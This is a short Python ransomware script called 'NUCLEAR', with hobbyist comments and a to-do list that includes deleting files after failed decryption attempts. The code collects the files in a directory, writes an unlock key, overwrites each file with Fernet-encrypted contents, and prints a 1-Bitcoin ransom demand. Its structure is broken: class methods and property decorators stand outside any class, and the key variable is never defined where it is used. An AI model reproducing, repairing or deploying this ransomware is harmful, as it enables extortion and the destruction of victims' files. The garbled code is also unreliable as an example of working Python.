#!/usr/bin/env python3
# Name : NUCLEAR - Version 1.0
# Date : 11-12-22
# Auth : Skrypt Kiddie

# Note : This is a simple ransomware written in python
# and yes, I watched NetworkChucks video on how to
# make this. Decided to name it NUCLEAR because why
# not lol.

# To Do
# --> Delete the files after 10 failed attemps
#     of decrypting it
# --> Rename eveything from ransomware to NUCLEAR


import os
import base64
import sys
from cryptography.fernet import Fernet

def __init__(self, name):
    self._name = name

@property
def name(self):
    return self._name

@name.setter
def name(self, new_name):
    self._name = new_name

@property
def key(self):
    key = Fernet.generate_key()

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "unlock.key" or file == "decryptor.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("unlock.key", "wb") as unlock:
    unlock.write(key)

def ransom_user(self):
    print("All of your files have been encrypted!! Send 1 Bitcoin or your files will be NUKED!!")

def encrypt_file(self, file):
    with open(file, "rb") as files:
        contents = files.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as files:
        files.write(contents_encrypted)

def get_files_in_folder(self, path):

    for file in os.listdir(path):
        if file == "README.md" or file == "decryptor.py" or file == "ransomware.py" or file == sys.argv[0]:
            continue
        file_path = os.path .join(path, file)
        if os.path.isfile(file_path):
            files.append(file_path)
